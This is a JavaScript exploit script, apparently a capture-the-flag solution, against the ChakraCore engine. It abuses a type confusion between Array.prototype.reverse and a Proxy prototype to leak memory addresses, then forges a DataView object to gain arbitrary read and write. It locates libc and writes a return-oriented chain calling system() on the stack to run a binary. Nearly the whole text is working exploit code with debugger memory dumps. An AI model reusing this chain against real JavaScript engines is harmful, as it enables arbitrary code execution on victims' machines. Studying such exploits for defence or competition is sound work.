// arrrrrrrrrgh, my crappy exploit!!!
function gc()
{
var gc_arr = [];
for(var i=0;i<0x350000;i++) {
gc_arr.push([]);
}
gc_arr = null;
}
var count = 512;
var defrag_arr = new Array(count);
function u32(val)
{
if(val >= 0) return val;
return 0x100000000 + val;
}
function makeqword(lo,hi) {return u32(lo)+ ((u32(hi)) * 0x100000000);}
function makesigned(val) {return (val)|0;}
function hiword(val) {return makesigned((val)/0x100000000);}
function loword(val) {return makesigned((val)&0xffffffff);}
for(var i=0;i<count;i++) {
defrag_arr[i] = new Array(
0x11111111,0x22222222,0x33333333,0x44444444,
0x55555555,0x66666666,0x77777777,0x7fffffff,
0x31337,0x31337,0x31337,0x31337, 
0x31337,0x31337,0x31337,0x31337
);
}
var evilarr = new Array(console.log);
evilarr.length = defrag_arr[0].length;
evilarr.__proto__ = new Proxy({}, {getPrototypeOf:function(){return defrag_arr[count/2];}});
evilarr.__proto__.reverse = Array.prototype.reverse;
evilarr.reverse();
//var seg = evilarr[0];
var vtable = evilarr[6];
var arrtype = evilarr[5];
var uint32arr = new ArrayBuffer(0x10);
//var a = evilarr[8];
var karr = new Array(
0x11111111,0x22222222,0x33333333,0x44444444,
0x55555555,0x66666666,0x77777777,0x7fffffff,
0x31337,0x31337,0x31337,0x31337, 
0x31337,0x31337,0x31337,0x31337
);
var karr2 = new Array(
0x11111111,0x22222222,0x33333333,0x44444444,
0x55555555,0x66666666,0x77777777,0x7fffffff,
0x31337,0x31337,0x31337,0x31337, 
0x31337,0x31337,0x31337,0x31337
);
karr2["cccc"] = 0x0;
karr2["dddd"] = arrtype;
karr2["eeee"] = 0x5a6b7c8d; // search sig
karr2["ffff"] = 0x13371337;
karr2["gggg"] = 0x13371338;
karr2["hhhh"] = 0x13371339;
karr2["jjjj"] = 0x1337133a;
karr2["kkkk"] = 0x1337133b;
karr2["1xxx"] = 0x1337133c;
karr2["2xxx"] = 0x1337133d;
karr2["3xxx"] = 0x1337133e;
karr2["4xxx"] = 0x1337133f;
karr2["5xxx"] = 0x0;
karr2["6xxx"] = 0x0;
karr2["7xxx"] = 0x0;
karr2["8xxx"] = 0x0;
karr2["9xxx"] = 0x0;
karr2["axxx"] = 0x0;
karr2["bxxx"] = 0x0;
karr2["cxxx"] = 0x0;
var karr3 = new Array(
0x7f7f7f7f,0x22222222,0x33333333,0x44444444,
0x55555555,0x66666666,0x77777777,0x7fffffff,
0x31337,0x31337,0x31337,0x31337, 
0x31337,0x31337,0x31337,0x31337
);
var karr4 = new Array(
0x11111111,0x22222222,0x33333333,0x44444444,
0x55555555,0x66666666,0x77777777,0x7fffffff,
0x31337,0x31337,0x31337,0x31337, 
0x31337,0x31337,0x31337,0x31337
);
var fdv = new DataView(new ArrayBuffer(8));
var evilarr2 = new Array(console.log);
evilarr2.length = karr.length;
evilarr2.__proto__ = new Proxy({}, {getPrototypeOf:function(){return karr;}});
evilarr2.__proto__.reverse = Array.prototype.reverse;
evilarr2.reverse();
var l = evilarr2[4];
defrag_arr = null;
CollectGarbage(); // not working??? 
//gc();
var scount2 = 0x10000;
var count2 = 0x100000;
var arrc2 = [];
for(var i=0;i<count2 ;i++) {
arrc2.push([0, 0x12345678, 0x66666666, 0x66666666, 
0, 1, 2, 3, 
0, 1, 2, 3, 
0, 1, 2, 3, 
0, 1, 2, 3, 
0x66666600, 0x66666601, 0x0, arrtype,
0x66666604, 0x66666605, 0x66666606, 0x66666607,
0x66666608, 0x66666609, 0x6666660a, 0x6666660b,
0x6666660c, 0x6666660d, 0x6666660e, 0x6666660f,
0x66666610, 0x66666611, 0x66666612, 0x66666613,
0x66666614, -2147483646, vtable, arrtype,
0x1234, 0x30005, 0x1234, l,
l, l, arrtype, arrtype,
uint32arr, uint32arr, uint32arr, uint32arr,
//0x66666624, 0x66666625, 0x66666626, 0x66666627,
null, null, null, null,
//0x66666628, 0x66666629, 0x6666662a, 0x6666662b
null, null, null, null
]);
}
/*
pwndbg> dq 0x7ffff15843d0 40
00007ffff15843d0     000100005a6b7c8d 0001000013371337
00007ffff15843e0     0001000013371338 0001000013371339
00007ffff15843f0     000100001337133a 000100001337133b
00007ffff1584400     000100001337133c 000100001337133d
00007ffff1584410     000100001337133e 000100001337133f
00007ffff1584420     0001000000000000 0001000000000000
00007ffff1584430     0001000000000000 0001000000000000
00007ffff1584440     0001000000000000 0001000000000000
00007ffff1584450     0001000000000000 0001000000000000
00007ffff1584460     00007ffff6487800 00007ffff1694f00 <- karr3
00007ffff1584470     0000000000000000 0000000000050005
00007ffff1584480     0000000000000010 00007ffff15844a0
00007ffff1584490     00007ffff15844a0 00007ffff7e489c0
00007ffff15844a0     0000001000000000 0000000000000012
00007ffff15844b0     0000000000000000 222222227f7f7f7f
00007ffff15844c0     4444444433333333 6666666655555555
00007ffff15844d0     7fffffff77777777 0003133700031337
00007ffff15844e0     0003133700031337 0003133700031337
00007ffff15844f0     0003133700031337 8000000280000002
00007ffff1584500     00007ffff6487800 00007ffff1694f00
*/
/* now leak what we need */
var seg = evilarr[0];
var lo_leak = u32(seg[34]);
var hi_leak = u32(seg[35]);
var leak_addr = hi_leak * 0x100000000 + lo_leak;
console.log("leak_addr = 0x" + leak_addr.toString(16));
var chakra_base = leak_addr - 0xc8f800;
console.log("chakra_base = 0x" + chakra_base.toString(16));
var lo_leak = u32(seg[44]);
var hi_leak = u32(seg[45]);
var heap_leak = makeqword(lo_leak, hi_leak);
console.log("heap_leak = 0x" + heap_leak.toString(16));
var clear_zero = chakra_base + 0x5a8db0;
/* fake DataView type */
seg[56] = 56;
seg[57] = 0;
seg[58] = loword(heap_leak);
seg[59] = hiword(heap_leak);
seg[60] = loword(clear_zero);
seg[61] = hiword(clear_zero);
var fake_table = heap_leak + 0x28 - 0x340;
var fake_table_addr = heap_leak + 0x30;
seg[62] = loword(fake_table);
seg[63] = hiword(fake_table);
var faketype = heap_leak + 0x18;
seg[36] = loword(faketype);
seg[37] = hiword(faketype); // fake type
seg[44] = loword(fake_table_addr);
seg[45] = hiword(fake_table_addr); // isDetached bypass
seg[42] = 0x200; // length
seg[48] = loword(chakra_base);
seg[49] = hiword(chakra_base); // addr
//console.log(fdv.getUint32.call(karr3, 0, true));
function setaddr(val64)
{
seg[48] = loword(val64);
seg[49] = hiword(val64);
return;
}
function read64(addr)
{
setaddr(addr);
return makeqword(fdv.getInt32.call(karr3, 0, true), fdv.getUint32.call(karr3, 4, true));
}
function write64(addr, val64)
{
setaddr(addr);
fdv.setInt32.call(karr3, 0, loword(val64), true);
fdv.setInt32.call(karr3, 4, hiword(val64), true);
}
var libc_leak = read64(chakra_base + 0xcc80f0);
console.log("libc_leak = 0x" + libc_leak.toString(16));
var libc_base = libc_leak - 0x83940;
console.log("libc_base = 0x" + libc_base.toString(16));
var environ = read64(libc_base + 0x3c5f38);
console.log("environ = 0x" + environ.toString(16));
var ret_addr = environ - 248;
var system = libc_base + 0x45390;
var poprdi_ret = libc_base + 0x21102;
var bss = libc_base + 0x3c8200;
var exit = libc_base + 0x3a030
//ls -la
//write64(bss, 0x2d20736c);
//write64(bss+4, 0x2020616c);
//./execMe_plz
//5f706c7a
write64(bss, 0x78652f2e);
write64(bss+4,0x654d6365);
write64(bss+8,0x7a6c705f);
console.log("writing rop chain");
write64(ret_addr, poprdi_ret);
write64(ret_addr+8, bss);
write64(ret_addr+16, system);
write64(ret_addr+24, exit);
//write64(0x1, 0x0);
console.log("Done!");

